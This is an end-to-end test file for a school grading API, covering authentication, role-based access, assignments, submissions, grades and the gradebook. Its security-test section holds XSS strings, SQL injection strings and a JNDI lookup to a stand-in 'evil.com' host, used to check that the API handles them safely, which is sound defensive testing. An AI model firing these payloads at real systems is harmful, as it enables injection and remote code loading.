import { Test, TestingModule } from '@nestjs/testing';
import { INestApplication, ValidationPipe } from '@nestjs/common';
import request from 'supertest';
import { AppModule } from '../src/app.module';
import { PrismaService } from '../src/prisma/prisma.service';

// Set test environment variables
process.env.JWT_SECRET = 'test-jwt-secret-minimum-32-characters-long-12345';
process.env.JWT_REFRESH_SECRET = 'test-refresh-secret-32-characters-long-67890';
process.env.NODE_ENV = 'test';
process.env.REDIS_URL = 'redis://localhost:6379';

describe('GradingController (e2e)', () => {
    let app: INestApplication;
    let prisma: PrismaService;

    // Test data
    let adminToken: string;
    let teacherToken: string;
    let parentToken: string;
    let studentToken: string;
    let adminId: string;
    let teacherId: string;
    let studentId: string;
    let courseId: string;
    let classId: string;
    let assignmentId: string;
    let submissionId: string;

    beforeAll(async () => {
        const moduleFixture: TestingModule = await Test.createTestingModule({
            imports: [AppModule],
        }).compile();

        app = moduleFixture.createNestApplication();
        app.useGlobalPipes(new ValidationPipe({ whitelist: true, transform: true }));
        await app.init();

        prisma = moduleFixture.get<PrismaService>(PrismaService);
    });

    afterAll(async () => {
        await app.close();
    });

    beforeEach(async () => {
        // Clean up in correct order
        await prisma.grade.deleteMany({});
        await prisma.submission.deleteMany({});
        await prisma.assignment.deleteMany({});
        await prisma.classEnrollment.deleteMany({});
        await prisma.classTeacher.deleteMany({});
        await prisma.class.deleteMany({});
        await prisma.course.deleteMany({});
        await prisma.parentStudent.deleteMany({});
        await prisma.userRole.deleteMany({});
        await prisma.refreshToken.deleteMany({});
        await prisma.user.deleteMany({
            where: { email: { contains: 'test@' } },
        });

        // Create test users
        const adminResponse = await request(app.getHttpServer())
            .post('/api/auth/register')
            .send({
                email: 'test@admin.school.com',
                password: 'Password123!',
                firstName: 'Admin',
                lastName: 'User',
                role: 'admin',
            });
        adminToken = adminResponse.body.accessToken;
        adminId = adminResponse.body.user.id;

        const teacherResponse = await request(app.getHttpServer())
            .post('/api/auth/register')
            .send({
                email: 'test@teacher.school.com',
                password: 'Password123!',
                firstName: 'Teacher',
                lastName: 'User',
                role: 'teacher',
            });
        teacherToken = teacherResponse.body.accessToken;
        teacherId = teacherResponse.body.user.id;

        const parentResponse = await request(app.getHttpServer())
            .post('/api/auth/register')
            .send({
                email: 'test@parent.school.com',
                password: 'Password123!',
                firstName: 'Parent',
                lastName: 'User',
                role: 'parent',
            });
        parentToken = parentResponse.body.accessToken;

        const studentResponse = await request(app.getHttpServer())
            .post('/api/auth/register')
            .send({
                email: 'test@student.school.com',
                password: 'Password123!',
                firstName: 'Student',
                lastName: 'User',
                role: 'student',
            });
        studentToken = studentResponse.body.accessToken;
        studentId = studentResponse.body.user.id;

        // Create course
        const courseResponse = await request(app.getHttpServer())
            .post('/api/courses')
            .set('Authorization', `Bearer ${adminToken}`)
            .send({
                code: 'MATH101',
                name: 'Mathematics 101',
            });
        courseId = courseResponse.body.id;

        // Create class
        const classResponse = await request(app.getHttpServer())
            .post('/api/classes')
            .set('Authorization', `Bearer ${adminToken}`)
            .send({
                courseId: courseId,
                teacherId: teacherId,
                term: 'Fall 2025',
            });
        classId = classResponse.body.id;

        // Enroll student
        await request(app.getHttpServer())
            .post(`/api/classes/${classId}/enroll`)
            .set('Authorization', `Bearer ${adminToken}`)
            .send({ studentId: studentId });

        // Create assignment
        const assignmentResponse = await request(app.getHttpServer())
            .post(`/api/classes/${classId}/assignments`)
            .set('Authorization', `Bearer ${teacherToken}`)
            .send({
                title: 'Test Assignment',
                description: 'Test assignment description',
                dueDate: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString(),
                maxPoints: 100,
                type: 'homework',
            });
        assignmentId = assignmentResponse.body.id;
    });

    // ===============================================================================
    // AUTHENTICATION TESTS
    // ===============================================================================
    describe('Authentication', () => {
        it('should return 401 when no token provided', async () => {
            await request(app.getHttpServer())
                .get('/api/assignments/pending/count')
                .expect(401);
        });

        it('should return 401 for assignment creation without token', async () => {
            await request(app.getHttpServer())
                .post(`/api/classes/${classId}/assignments`)
                .send({
                    title: 'Hacked Assignment',
                    dueDate: new Date().toISOString(),
                })
                .expect(401);
        });

        it('should return 401 with invalid token', async () => {
            await request(app.getHttpServer())
                .get(`/api/assignments/${assignmentId}`)
                .set('Authorization', 'Bearer invalid.token.here')
                .expect(401);
        });
    });

    // ===============================================================================
    // ROLE-BASED ACCESS TESTS
    // ===============================================================================
    describe('Role-Based Access Control', () => {
        describe('Assignment Creation', () => {
            it('should allow admin to create assignments', async () => {
                await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/assignments`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({
                        title: 'Admin Assignment',
                        dueDate: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString(),
                    })
                    .expect(201);
            });

            it('should allow teacher to create assignments', async () => {
                await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/assignments`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        title: 'Teacher Assignment',
                        dueDate: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString(),
                    })
                    .expect(201);
            });

            it('should block parent from creating assignments', async () => {
                await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/assignments`)
                    .set('Authorization', `Bearer ${parentToken}`)
                    .send({
                        title: 'Parent Assignment',
                        dueDate: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString(),
                    })
                    .expect(403);
            });

            it('should block student from creating assignments', async () => {
                await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/assignments`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .send({
                        title: 'Student Assignment',
                        dueDate: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString(),
                    })
                    .expect(403);
            });
        });

        describe('Assignment Updates', () => {
            it('should allow teacher to update own assignment', async () => {
                await request(app.getHttpServer())
                    .put(`/api/assignments/${assignmentId}`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({ title: 'Updated Assignment' })
                    .expect(200);
            });

            it('should allow admin to update any assignment', async () => {
                await request(app.getHttpServer())
                    .put(`/api/assignments/${assignmentId}`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({ title: 'Admin Updated' })
                    .expect(200);
            });

            it('should block student from updating assignments', async () => {
                await request(app.getHttpServer())
                    .put(`/api/assignments/${assignmentId}`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .send({ title: 'Hacked Assignment' })
                    .expect(403);
            });
        });

        describe('Assignment Deletion', () => {
            it('should allow teacher to delete own assignment', async () => {
                const assignment = await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/assignments`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        title: 'To Delete',
                        dueDate: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString(),
                    });

                await request(app.getHttpServer())
                    .delete(`/api/assignments/${assignment.body.id}`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .expect(200);
            });

            it('should block student from deleting assignments', async () => {
                await request(app.getHttpServer())
                    .delete(`/api/assignments/${assignmentId}`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(403);
            });
        });

        describe('Submission Access', () => {
            it('should only allow students to submit', async () => {
                await request(app.getHttpServer())
                    .post(`/api/assignments/${assignmentId}/submit`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .send({ content: 'My submission' })
                    .expect(201);
            });

            it('should block teacher from submitting', async () => {
                await request(app.getHttpServer())
                    .post(`/api/assignments/${assignmentId}/submit`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({ content: 'Teacher submission' })
                    .expect(403);
            });

            it('should allow teacher to view all submissions', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/assignments/${assignmentId}/submissions`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .expect(200);

                expect(response.body).toBeDefined();
            });

            it('should block student from viewing all submissions', async () => {
                await request(app.getHttpServer())
                    .get(`/api/assignments/${assignmentId}/submissions`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(403);
            });
        });

        describe('Grading Access', () => {
            it('should allow teacher to grade submissions', async () => {
                // First create a submission
                const submission = await request(app.getHttpServer())
                    .post(`/api/assignments/${assignmentId}/submit`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .send({ content: 'My submission' });

                await request(app.getHttpServer())
                    .post(`/api/submissions/${submission.body.id}/grade`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({ score: 85, feedback: 'Good work!' })
                    .expect(201);
            });

            it('should block student from grading', async () => {
                await request(app.getHttpServer())
                    .post(`/api/submissions/${assignmentId}/grade`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .send({ score: 100 })
                    .expect(403);
            });

            it('should allow teacher to bulk grade', async () => {
                await request(app.getHttpServer())
                    .post(`/api/assignments/${assignmentId}/grades/bulk`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        grades: [
                            { studentId: studentId, score: 90 },
                        ],
                    })
                    .expect(201);
            });
        });

        describe('Gradebook Access', () => {
            it('should allow teacher to access class gradebook', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/classes/${classId}/gradebook`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .expect(200);

                expect(response.body).toBeDefined();
            });

            it('should block student from accessing class gradebook', async () => {
                await request(app.getHttpServer())
                    .get(`/api/classes/${classId}/gradebook`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(403);
            });
        });
    });

    // ===============================================================================
    // ASSIGNMENTS CRUD TESTS
    // ===============================================================================
    describe('Assignments CRUD', () => {
        describe('GET /api/assignments/:id', () => {
            it('should return 200 with assignment details', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/assignments/${assignmentId}`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(200);

                expect(response.body.id).toBe(assignmentId);
                expect(response.body.title).toBe('Test Assignment');
            });

            it('should return 404 for non-existent assignment', async () => {
                const nonExistentUuid = '12345678-1234-1234-1234-123456789abc';
                await request(app.getHttpServer())
                    .get(`/api/assignments/${nonExistentUuid}`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(404);
            });

            it('should return 400 for invalid UUID', async () => {
                await request(app.getHttpServer())
                    .get('/api/assignments/invalid-uuid')
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(400);
            });
        });

        describe('GET /api/classes/:classId/assignments', () => {
            it('should return assignments for a class', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/classes/${classId}/assignments`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(200);

                expect(Array.isArray(response.body)).toBe(true);
            });

            it('should filter by type', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/classes/${classId}/assignments?type=homework`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(200);

                expect(Array.isArray(response.body)).toBe(true);
            });
        });

        describe('POST /api/classes/:classId/assignments', () => {
            it('should return 201 with valid data', async () => {
                const response = await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/assignments`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        title: 'New Assignment',
                        description: 'Description here',
                        dueDate: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString(),
                        maxPoints: 100,
                        type: 'quiz',
                    })
                    .expect(201);

                expect(response.body.id).toBeDefined();
                expect(response.body.title).toBe('New Assignment');
            });

            it('should return 400 for missing required fields', async () => {
                await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/assignments`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({ description: 'Missing title' })
                    .expect(400);
            });

            it('should return 400 for invalid due date', async () => {
                await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/assignments`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        title: 'Invalid Date',
                        dueDate: 'not-a-date',
                    })
                    .expect(400);
            });

            it('should return 400 for invalid type enum', async () => {
                await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/assignments`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        title: 'Invalid Type',
                        dueDate: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString(),
                        type: 'invalid_type',
                    })
                    .expect(400);
            });

            it('should validate maxPoints range', async () => {
                await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/assignments`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        title: 'Too Many Points',
                        dueDate: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString(),
                        maxPoints: 100000,
                    })
                    .expect(400);
            });
        });

        describe('PUT /api/assignments/:id', () => {
            it('should return 200 when updating assignment', async () => {
                const response = await request(app.getHttpServer())
                    .put(`/api/assignments/${assignmentId}`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        title: 'Updated Title',
                        maxPoints: 150,
                    })
                    .expect(200);

                expect(response.body.title).toBe('Updated Title');
            });

            it('should return 404 for non-existent assignment', async () => {
                const nonExistentUuid = '12345678-1234-1234-1234-123456789abc';
                await request(app.getHttpServer())
                    .put(`/api/assignments/${nonExistentUuid}`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({ title: 'Updated' })
                    .expect(404);
            });

            it('should allow publishing assignment', async () => {
                const response = await request(app.getHttpServer())
                    .put(`/api/assignments/${assignmentId}`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({ isPublished: true })
                    .expect(200);

                expect(response.body.isPublished).toBe(true);
            });
        });

        describe('DELETE /api/assignments/:id', () => {
            it('should return 200 when deleting assignment', async () => {
                const assignment = await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/assignments`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        title: 'To Delete',
                        dueDate: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString(),
                    });

                await request(app.getHttpServer())
                    .delete(`/api/assignments/${assignment.body.id}`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .expect(200);
            });

            it('should return 404 for non-existent assignment', async () => {
                const nonExistentUuid = '12345678-1234-1234-1234-123456789abc';
                await request(app.getHttpServer())
                    .delete(`/api/assignments/${nonExistentUuid}`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .expect(404);
            });
        });
    });

    // ===============================================================================
    // SUBMISSION TESTS
    // ===============================================================================
    describe('Submissions', () => {
        describe('POST /api/assignments/:id/submit', () => {
            it('should create submission with content', async () => {
                const response = await request(app.getHttpServer())
                    .post(`/api/assignments/${assignmentId}/submit`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .send({
                        content: 'Here is my submission content',
                    })
                    .expect(201);

                expect(response.body.id).toBeDefined();
                submissionId = response.body.id;
            });

            it('should create submission with file attachments', async () => {
                const response = await request(app.getHttpServer())
                    .post(`/api/assignments/${assignmentId}/submit`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .send({
                        content: 'Submission with files',
                        fileIds: ['file-uuid-1', 'file-uuid-2'],
                    })
                    .expect(201);

                expect(response.body.id).toBeDefined();
            });

            it('should limit file attachments to 10', async () => {
                const manyFiles = Array(11).fill('file-uuid');
                await request(app.getHttpServer())
                    .post(`/api/assignments/${assignmentId}/submit`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .send({
                        content: 'Too many files',
                        fileIds: manyFiles,
                    })
                    .expect(400);
            });

            it('should return 409 for duplicate submission', async () => {
                // First submission
                await request(app.getHttpServer())
                    .post(`/api/assignments/${assignmentId}/submit`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .send({ content: 'First submission' });

                // Second submission should fail or update
                const response = await request(app.getHttpServer())
                    .post(`/api/assignments/${assignmentId}/submit`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .send({ content: 'Second submission' });

                // Either 409 conflict or 200 update
                expect([200, 201, 409]).toContain(response.status);
            });

            it('should reject submission for non-enrolled student', async () => {
                // Create new student not enrolled in class
                const newStudent = await request(app.getHttpServer())
                    .post('/api/auth/register')
                    .send({
                        email: 'test@unenrolled.school.com',
                        password: 'Password123!',
                        firstName: 'Unenrolled',
                        lastName: 'Student',
                        role: 'student',
                    });

                await request(app.getHttpServer())
                    .post(`/api/assignments/${assignmentId}/submit`)
                    .set('Authorization', `Bearer ${newStudent.body.accessToken}`)
                    .send({ content: 'I am not enrolled' })
                    .expect(403);
            });
        });

        describe('GET /api/assignments/:assignmentId/submissions/my', () => {
            it('should return own submission', async () => {
                // First submit
                await request(app.getHttpServer())
                    .post(`/api/assignments/${assignmentId}/submit`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .send({ content: 'My submission' });

                const response = await request(app.getHttpServer())
                    .get(`/api/assignments/${assignmentId}/submissions/my`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(200);

                expect(response.body).toBeDefined();
            });

            it('should return 404 if no submission', async () => {
                // Create new assignment
                const newAssignment = await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/assignments`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        title: 'No Submissions Yet',
                        dueDate: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString(),
                    });

                await request(app.getHttpServer())
                    .get(`/api/assignments/${newAssignment.body.id}/submissions/my`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(404);
            });
        });
    });

    // ===============================================================================
    // GRADING TESTS
    // ===============================================================================
    describe('Grading', () => {
        let submissionId: string;

        beforeEach(async () => {
            // Create a submission for grading
            const submission = await request(app.getHttpServer())
                .post(`/api/assignments/${assignmentId}/submit`)
                .set('Authorization', `Bearer ${studentToken}`)
                .send({ content: 'Grade me please' });
            submissionId = submission.body.id;
        });

        describe('POST /api/submissions/:id/grade', () => {
            it('should grade submission with score only', async () => {
                const response = await request(app.getHttpServer())
                    .post(`/api/submissions/${submissionId}/grade`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({ score: 85 })
                    .expect(201);

                expect(response.body.score).toBe(85);
            });

            it('should grade with feedback and letter grade', async () => {
                const response = await request(app.getHttpServer())
                    .post(`/api/submissions/${submissionId}/grade`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        score: 92,
                        feedback: 'Excellent work!',
                        letterGrade: 'A',
                    })
                    .expect(201);

                expect(response.body.score).toBe(92);
                expect(response.body.feedback).toBe('Excellent work!');
            });

            it('should return 400 for negative score', async () => {
                await request(app.getHttpServer())
                    .post(`/api/submissions/${submissionId}/grade`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({ score: -10 })
                    .expect(400);
            });

            it('should return 400 for score exceeding max', async () => {
                await request(app.getHttpServer())
                    .post(`/api/submissions/${submissionId}/grade`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({ score: 999999 })
                    .expect(400);
            });

            it('should return 404 for non-existent submission', async () => {
                const nonExistentUuid = '12345678-1234-1234-1234-123456789abc';
                await request(app.getHttpServer())
                    .post(`/api/submissions/${nonExistentUuid}/grade`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({ score: 80 })
                    .expect(404);
            });

            it('should update existing grade', async () => {
                // First grade
                await request(app.getHttpServer())
                    .post(`/api/submissions/${submissionId}/grade`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({ score: 75 });

                // Update grade
                const response = await request(app.getHttpServer())
                    .post(`/api/submissions/${submissionId}/grade`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({ score: 85 })
                    .expect(201);

                expect(response.body.score).toBe(85);
            });
        });

        describe('POST /api/assignments/:id/grades/bulk', () => {
            it('should bulk grade multiple students', async () => {
                // Create another student and enroll
                const anotherStudent = await request(app.getHttpServer())
                    .post('/api/auth/register')
                    .send({
                        email: 'test@student2.school.com',
                        password: 'Password123!',
                        firstName: 'Another',
                        lastName: 'Student',
                        role: 'student',
                    });

                await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/enroll`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({ studentId: anotherStudent.body.user.id });

                const response = await request(app.getHttpServer())
                    .post(`/api/assignments/${assignmentId}/grades/bulk`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        grades: [
                            { studentId: studentId, score: 85, feedback: 'Good' },
                            { studentId: anotherStudent.body.user.id, score: 90, feedback: 'Great' },
                        ],
                    })
                    .expect(201);

                expect(response.body).toBeDefined();
            });

            it('should limit bulk grades to 100 students', async () => {
                const manyGrades = Array(101).fill({
                    studentId: studentId,
                    score: 80,
                });

                await request(app.getHttpServer())
                    .post(`/api/assignments/${assignmentId}/grades/bulk`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({ grades: manyGrades })
                    .expect(400);
            });

            it('should validate student IDs in bulk grades', async () => {
                await request(app.getHttpServer())
                    .post(`/api/assignments/${assignmentId}/grades/bulk`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        grades: [
                            { studentId: 'invalid-uuid', score: 80 },
                        ],
                    })
                    .expect(400);
            });
        });
    });

    // ===============================================================================
    // GRADEBOOK TESTS
    // ===============================================================================
    describe('Gradebook', () => {
        describe('GET /api/classes/:classId/gradebook', () => {
            it('should return class gradebook', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/classes/${classId}/gradebook`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .expect(200);

                expect(response.body).toBeDefined();
            });

            it('should include all students and assignments', async () => {
                // Create assignment and enroll student
                await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/enroll`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({ studentId: studentId });

                const response = await request(app.getHttpServer())
                    .get(`/api/classes/${classId}/gradebook`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .expect(200);

                expect(response.body).toBeDefined();
            });
        });

        describe('GET /api/students/:studentId/grades', () => {
            it('should return student grades', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/students/${studentId}/grades`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .expect(200);

                expect(response.body).toBeDefined();
            });

            it('should filter by classId', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/students/${studentId}/grades?classId=${classId}`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .expect(200);

                expect(response.body).toBeDefined();
            });
        });

        describe('GET /api/grades/my', () => {
            it('should return own grades for student', async () => {
                const response = await request(app.getHttpServer())
                    .get('/api/grades/my')
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(200);

                expect(response.body).toBeDefined();
            });

            it('should filter own grades by class', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/grades/my?classId=${classId}`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(200);

                expect(response.body).toBeDefined();
            });
        });
    });

    // ===============================================================================
    // SECURITY TESTS
    // ===============================================================================
    describe('Security Tests', () => {
        it('should sanitize XSS in assignment content', async () => {
            const xssPayload = '<script>alert("xss")</script>';

            await request(app.getHttpServer())
                .post(`/api/classes/${classId}/assignments`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .send({
                    title: 'XSS Test',
                    description: xssPayload,
                    dueDate: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString(),
                })
                .expect(201);
        });

        it('should sanitize XSS in submission content', async () => {
            const xssPayload = '<img src=x onerror=alert(1)>';

            await request(app.getHttpServer())
                .post(`/api/assignments/${assignmentId}/submit`)
                .set('Authorization', `Bearer ${studentToken}`)
                .send({ content: xssPayload })
                .expect(201);
        });

        it('should sanitize XSS in feedback', async () => {
            // First create submission
            const submission = await request(app.getHttpServer())
                .post(`/api/assignments/${assignmentId}/submit`)
                .set('Authorization', `Bearer ${studentToken}`)
                .send({ content: 'Grade me' });

            await request(app.getHttpServer())
                .post(`/api/submissions/${submission.body.id}/grade`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .send({
                    score: 80,
                    feedback: '<script>alert("xss")</script>',
                })
                .expect(201);
        });

        it('should prevent SQL injection in assignment title', async () => {
            await request(app.getHttpServer())
                .post(`/api/classes/${classId}/assignments`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .send({
                    title: '\'; DROP TABLE assignments; --',
                    dueDate: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString(),
                })
                .expect(201);

            // Verify assignments still exist
            const response = await request(app.getHttpServer())
                .get(`/api/classes/${classId}/assignments`)
                .set('Authorization', `Bearer ${studentToken}`)
                .expect(200);

            expect(Array.isArray(response.body)).toBe(true);
        });

        it('should reject oversized content', async () => {
            const hugeContent = 'a'.repeat(15000);

            await request(app.getHttpServer())
                .post(`/api/assignments/${assignmentId}/submit`)
                .set('Authorization', `Bearer ${studentToken}`)
                .send({ content: hugeContent })
                .expect(400);
        });

        it('should validate all UUID parameters', async () => {
            const injectionAttempts = [
                "' OR '1'='1",
                "${jndi:ldap://evil.com}",
                "<script>alert(1)</script>",
            ];

            for (const attempt of injectionAttempts) {
                await request(app.getHttpServer())
                    .get(`/api/assignments/${encodeURIComponent(attempt)}`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(400);
            }
        });
    });

    // ===============================================================================
    // EDGE CASES
    // ===============================================================================
    describe('Edge Cases', () => {
        it('should handle concurrent submissions', async () => {
            const promises = Array(5).fill(0).map(() =>
                request(app.getHttpServer())
                    .post(`/api/assignments/${assignmentId}/submit`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .send({ content: 'Concurrent submission' })
            );

            const responses = await Promise.all(promises);

            responses.forEach(response => {
                expect([201, 409, 400]).toContain(response.status);
            });
        });

        it('should handle grading non-existent submission gracefully', async () => {
            const nonExistentUuid = '12345678-1234-1234-1234-123456789abc';
            await request(app.getHttpServer())
                .post(`/api/submissions/${nonExistentUuid}/grade`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .send({ score: 80 })
                .expect(404);
        });

        it('should handle late submissions', async () => {
            // Create past due assignment
            const pastAssignment = await request(app.getHttpServer())
                .post(`/api/classes/${classId}/assignments`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .send({
                    title: 'Past Due',
                    dueDate: new Date(Date.now() - 7 * 24 * 60 * 60 * 1000).toISOString(), // 7 days ago
                });

            const response = await request(app.getHttpServer())
                .post(`/api/assignments/${pastAssignment.body.id}/submit`)
                .set('Authorization', `Bearer ${studentToken}`)
                .send({ content: 'Late submission' });

            // Should accept but mark as late
            expect([201, 400]).toContain(response.status);
        });

        it('should handle soft-deleted assignments', async () => {
            // Soft delete assignment
            await prisma.assignment.update({
                where: { id: assignmentId },
                data: { deletedAt: new Date() },
            });

            await request(app.getHttpServer())
                .get(`/api/assignments/${assignmentId}`)
                .set('Authorization', `Bearer ${studentToken}`)
                .expect(404);
        });

        it('should handle empty bulk grades array', async () => {
            await request(app.getHttpServer())
                .post(`/api/assignments/${assignmentId}/grades/bulk`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .send({ grades: [] })
                .expect(201);
        });

        it('should handle zero points assignment', async () => {
            const response = await request(app.getHttpServer())
                .post(`/api/classes/${classId}/assignments`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .send({
                    title: 'Extra Credit',
                    dueDate: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString(),
                    maxPoints: 0,
                })
                .expect(201);

            expect(response.body.maxPoints).toBe(0);
        });

        it('should validate letter grade format', async () => {
            // Create submission
            const submission = await request(app.getHttpServer())
                .post(`/api/assignments/${assignmentId}/submit`)
                .set('Authorization', `Bearer ${studentToken}`)
                .send({ content: 'Grade me' });

            await request(app.getHttpServer())
                .post(`/api/submissions/${submission.body.id}/grade`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .send({
                    score: 85,
                    letterGrade: 'INVALID-GRADE-TOO-LONG',
                })
                .expect(400);
        });
    });
});
